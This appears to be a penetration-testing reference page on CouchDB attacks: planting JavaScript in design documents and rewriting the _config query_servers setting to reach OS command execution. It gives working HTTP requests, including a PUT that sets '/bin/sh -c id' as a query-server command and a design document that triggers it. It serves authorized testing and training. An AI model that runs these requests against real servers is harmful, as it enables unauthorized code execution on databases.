---
title: "JavaScript injection in CouchDB design documents and query servers"
description: "Writing a design document or reaching the _config query_servers settings runs attacker JavaScript in CouchDB's query server process, reaching code execution."
keywords:
  - CouchDB JavaScript injection
  - design document
  - query server
  - _config query_servers
  - server-side code execution
  - os_daemons
---

# JavaScript injection

CouchDB executes JavaScript server-side. Every design document (`_design/*`) is a JSON document whose fields hold function bodies as strings, and CouchDB ships those strings to a separate **query server** process (SpiderMonkey, historically) that compiles and runs them. Any path that lets an attacker place JavaScript into a design document, or redefine which interpreter the query server uses, runs attacker-controlled code inside the server.

> **Scope.** For authorized penetration tests, CTF labs, and assessment of systems you own or are contracted to test.

## The design-document surface

A design document is written with an ordinary `PUT`:

```http
PUT /app/_design/evil HTTP/1.1
Host: target:5984
Content-Type: application/json
Authorization: Basic ...

{
  "views": {
    "x": { "map": "function(doc){ emit(doc._id, doc); }" }
  },
  "shows": {
    "y": "function(doc, req){ return {body: JSON.stringify(doc)}; }"
  }
}
```

The `map`, `reduce`, `shows`, `lists`, `updates`, `filters`, and `validate_doc_update` fields are all JavaScript executed by the query server. An application that proxies untrusted input into a design-document write, or that lets a low-privilege user create design documents, hands the attacker a code-execution primitive inside the query-server sandbox. Reaching documents in these fields is the injection: the JavaScript runs the next time the corresponding view is built, the show/list is rendered, or the update handler fires.

## Triggering execution

A map function runs when its view is queried, which also builds it:

```http
GET /app/_design/evil/_view/x HTTP/1.1
```

A `show` function runs on request:

```http
GET /app/_design/evil/_show/y/somedocid HTTP/1.1
```

Inside these functions the attacker controls arbitrary JavaScript, including `JSON.stringify` over documents the function would not normally touch and loops that walk every emitted row.

## Reaching the query server configuration

The higher-impact class targets the `_config` API, specifically the `query_servers` section, which maps a language name to the command line CouchDB executes to start that interpreter:

```http
GET /_node/_local/_config/query_servers HTTP/1.1
```

```http
PUT /_node/_local/_config/query_servers/cmd HTTP/1.1
Host: target:5984
Content-Type: application/json

"/bin/sh -c id"
```

Because the value is a command line the server will execute to launch a "language", redefining or adding a query-server entry turns a configuration write into operating-system command execution the next time a document in that language is processed. The related `os_daemons` (and, in some versions, `native_query_servers`) configuration sections behave similarly: a value written there is a process CouchDB spawns. A design document can then declare `"language": "cmd"` to force the planted interpreter to run:

```http
PUT /app/_design/run HTTP/1.1

{ "language": "cmd", "views": { "z": { "map": "..." } } }
```

Querying `/app/_design/run/_view/z` drives CouchDB to invoke the attacker-supplied command line. CouchDB 2.x and later replaced the legacy top-level `/_config` with per-node `/_node/{name}/_config`; `_local` resolves to the node that handles the request, and a specific node name targets another node in a cluster.

## Finding the sink

Probe for write access to design documents and to `_config`: a `GET /_config` that returns the configuration tree, or a `PUT /app/_design/test` that succeeds, confirms the primitive. An application that forwards JSON bodies into CouchDB writes without constraining the `_id` prefix can be steered toward `_design/` by supplying that prefix in the injected document identifier.

## References

- [Apache CouchDB: Design documents](https://docs.couchdb.org/en/stable/ddocs/ddocs.html)
- [Apache CouchDB: Query server protocol](https://docs.couchdb.org/en/stable/query-server/protocol.html)
- [Apache CouchDB: Configuration API](https://docs.couchdb.org/en/stable/api/server/configuration.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
